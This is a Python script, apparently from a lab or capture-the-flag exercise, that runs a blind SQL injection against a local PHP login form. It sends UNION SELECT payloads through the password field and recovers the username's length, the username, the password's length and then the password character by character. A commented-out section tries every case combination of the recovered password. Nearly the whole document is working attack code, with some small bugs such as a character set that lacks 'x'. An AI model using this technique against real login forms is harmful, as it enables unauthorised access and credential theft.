import requests
import time
start = time.time()
# First part of the script for find the length of the identifiant
formulaire = requests.Session() # Allows to generate a session under the name of 'form' variable
url_local = "http://localhost/main.php"
response_html = formulaire.get(url=url_local)
resultat_html = response_html.text
final_length = []
for i in range(0, 64):
    champ_mdp = f"'UNION SELECT nom, prenom FROM utilisateurs WHERE LENGTH(identifiant)={i}#"
    champ_identif = ''
    send_sql = ({"identif":champ_identif, "mdp":champ_mdp})
    response = formulaire.post(url=url_local, data=send_sql)
    if (response.text.find('Veuillez') != -1):
        final_length.append(i)
print(f"The present username have for length {final_length}")
# ---------------------------------------------------------------------------
# Second part of the script for find the identifiant
carac = "abcdefghijklmnopqrstuvwyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
login = ''
vide = ''
for z in range(1, 8):
    for c in range(0, 27):
        injection = f"'UNION SELECT nom, prenom FROM utilisateurs WHERE LENGTH(identifiant)=4 AND SUBSTRING(identifiant, 1, {str(z)}) = '{login}{carac[c:c+1]}' #"
        send_sql = ({"identif": vide, "mdp": injection})
        response = formulaire.post(url=url_local, data=send_sql)
        if (response.text.find('Veuillez') != -1):
            login = login + carac[c:c+1]
            break
print(f"The login is: {login}")
# ---------------------------------------------------------------------------
# Third part of the script for find the length of the password
lenght_password = 0
for i in range(1, 20):
    injection = f"'UNION SELECT nom, prenom FROM utilisateurs WHERE identifiant='{login}' AND LENGTH(motdepasse)={i}#"
    champ_identif = ''
    send_sql = ({"identif":login, "mdp":injection})
    response = formulaire.post(url=url_local, data=send_sql)
    if (response.text.find('Veuillez') != -1):
        lenght_password = i
        break
print(f"The lenght of the {login} is to {lenght_password}")
# ---------------------------------------------------------------------------
# Fourth part of the script for find the password
motdepasse = ''
for h in range(1, lenght_password + 1):
    for c in range(0, len(carac)):
        injection = f"'UNION SELECT nom, prenom FROM utilisateurs WHERE identifiant='{login}' AND SUBSTRING(motdepasse, 1, {str(h)}) = '{motdepasse}{carac[c:c+1]}' #"
        send_sql = ({"identif": login, "mdp": injection})
        response = formulaire.post(url=url_local, data=send_sql)
        if (response.text.find('Veuillez') != -1):
            motdepasse = motdepasse + carac[c:c+1]
            break
print(f"The password is {motdepasse}")
# ---------------------------------------------------------------------------
# Last part is for find the good combinaison of uppercase and lowercase
# Review this part
"""
liste_pos_lettre = []
nbr_lettre = 0
motdepasse2 = str(motdepasse)
for c in range(0, len(motdepasse2)):
    debut = ord(motdepasse2[c:c+1])
    fin = ord(motdepasse2[c:c+1])
    if (debut > 96 and fin < 123) or (debut > 64 and fin < 91):
        liste_pos_lettre.append(c)
        nbr_lettre = nbr_lettre + 1
nbr_comb = 2 ** nbr_lettre
comb_mdp = ""

for comb in range(0, nbr_comb):
    for c in range(0, nbr_lettre):
        code_lettre = int(ord(motdepasse2[liste_pos_lettre[c]:liste_pos_lettre[c]+1])- 32 *((2 ** c & comb) / (2 ** c)))
        comb_mdp = comb_mdp + chr(code_lettre)
        if (c < nbr_lettre - 1):
            comb_mdp = comb_mdp + motdepasse2[liste_pos_lettre[c] + 1:liste_pos_lettre[c + 1]]
        if (liste_pos_lettre[nbr_lettre - 1] < len(motdepasse2)):
            comb_mdp = comb_mdp + motdepasse2[liste_pos_lettre[nbr_lettre - 1] + 1:len(motdepasse2)]
    print(comb_mdp)
    comb_mdp = ""
"""